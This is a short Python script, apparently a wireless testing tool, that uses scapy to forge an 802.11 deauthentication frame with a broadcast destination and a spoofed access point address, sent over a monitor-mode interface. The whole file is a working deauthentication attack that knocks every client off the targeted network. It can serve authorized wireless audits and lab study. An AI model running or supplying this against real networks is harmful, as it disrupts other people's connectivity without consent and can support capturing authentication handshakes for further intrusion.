#!/usr/bin/env python3

from argparse import ArgumentParser

from scapy.layers.dot11 import *

if __name__ == "__main__":
    args_parser = ArgumentParser()

    # TODO: probably the channel argument is needed.
    args_parser.add_argument("-i", "--iface", help="monitor mode interface", default="wlan0")
    args_parser.add_argument("-b", "--bssid", required=True)

    args = args_parser.parse_args()

    sendp(RadioTap()/Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=args.bssid, addr3=args.bssid)/Dot11Deauth(),
          iface=args.iface)
